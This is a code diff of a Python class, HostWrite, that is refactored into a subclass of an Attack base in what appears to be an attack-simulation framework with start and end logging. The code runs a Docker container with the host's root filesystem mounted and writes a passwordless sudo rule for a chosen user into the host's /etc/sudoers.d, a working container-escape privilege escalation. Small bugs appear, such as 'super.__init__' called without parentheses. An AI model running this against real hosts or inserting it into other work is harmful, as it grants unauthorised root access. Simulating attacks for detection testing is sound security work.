@@ -1,4 +1,5 @@
 import subprocess, time
+from ..attack import Attack
 
 files = {
     "docker_file": """
@@ -8,7 +9,7 @@ VOLUME $WORKDIR
 WORKDIR $WORKDIR""",
          }
 
-class HostWrite:
+class HostWrite(Attack):
     def __init__(self, trigger_time=5, workdir="privesc", image="priv_container", container="ESCAPE_PRIVESC", username="testuser"):
         self.trigger_time = trigger_time
         self.workdir = workdir
@@ -23,8 +24,9 @@ class HostWrite:
         dockerfile.write("WORKDIR $WORKDIR\n")
         dockerfile.close()
         subprocess.run(["docker", "build", "-t", image, "."])
+        super.__init__("host_exec")
     
-    def trigger_in(self, in_sec=0, kill_in_sec=0):
+    def execute(self, in_sec=0, kill_in_sec=0):
         # time.sleep(in_sec)
         subprocess.run('docker run --name {} -v /:/{} -dit {} /bin/sh'.format(self.container, self.workdir, self.image).split())
         # time.sleep(self.trigger_time)
@@ -32,11 +34,10 @@ class HostWrite:
         subprocess.run(['docker', 'exec', self.container, 'sh', '-c', 'echo "{} ALL=(ALL) NOPASSWD: ALL" > /{}/etc/sudoers.d/010_{}-nopasswd'.format(self.username, self.workdir, self.username)])
         # time.sleep(kill_in_sec)
 
-    def cleanup(self, in_sec=0):
-        time.sleep(in_sec=0)
-        subprocess.run(["docker", "image", "rm", self.image])
-
-
-hw = HostWrite(username="kmajdi")
-hw.trigger_in()
+    def get_log_start(self):
+        return f"[{self.time_start}][{self.name}][{self.container}] Attack Started"
+    
+    def get_log_end(self):
+        self.finalize()
+        return f"[{self.time_end}][{self.name}][{self.container}] Attack Ended"
 
